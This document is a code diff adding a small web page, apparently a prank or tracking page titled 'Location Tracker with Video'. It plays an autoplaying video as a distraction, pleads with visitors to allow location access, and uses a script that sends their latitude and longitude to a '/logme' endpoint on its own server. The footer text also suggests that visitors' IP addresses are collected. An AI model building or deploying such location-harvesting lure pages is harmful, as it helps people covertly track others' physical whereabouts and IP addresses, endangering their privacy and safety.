@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Location Tracker with Video</title>
+  <style>
+    body {
+      font-family: sans-serif;
+      text-align: center;
+      background-color: #f0f0f0;
+    }
+    iframe {
+      margin-top: 20px;
+      box-shadow: 0 0 20px rgba(0, 0, 0, 0.3);
+    }
+  </style>
+</head>
+<body>
+  <h2> Watch This While We Get Your Location ok? </h2>
+  <h2> pleaseeeeee allow the location please or i will will send rochas313 tree  </h2>
+ <h2> YWxyaWdodCB5b3UgY2FuIGkgYXNrIHlvdSB3aHkgeW91IGtub3cgYmFzZTY0IGZvcm1hdCBvaCByaWdodCBpdCBvbiB3ZWJzaWRlIHllcyBvciBub3QgPyBvaCByaWdodCBpIHdpbGwgdHJ5IHRvIHVwZGF0ZSB0aGlzIHdlYnNpZGUg </h2>
+
+  <!-- YouTube Video Embed -->
+<div style="text-align: center;">
+  <iframe width="720" height="405"
+          src="https://www.youtube.com/embed/Xazv5kB1Agk?autoplay=1&mute=1&loop=1&playlist=Xazv5kB1Agk&cc_load_policy=1"
+          title="YouTube video player"
+          frameborder="0"
+          allow="autoplay; encrypted-media"
+          allowfullscreen>
+  </iframe>
+</div>
+
+  <p style="margin-top: 30px;">Please allow location access when prompted. and make by Naomi and chatgpt is helper and thank for your ip :)</p>
+
+  <!-- Location Script -->
+  <script>
+    navigator.geolocation.getCurrentPosition(function(pos) {
+      const coords = `${pos.coords.latitude},${pos.coords.longitude}`;
+      fetch(`/logme?coords=${coords}`);
+    }, function(error) {
+      alert("Location error: " + error.message);
+    });
+  </script>
+</body>
+</html>
+
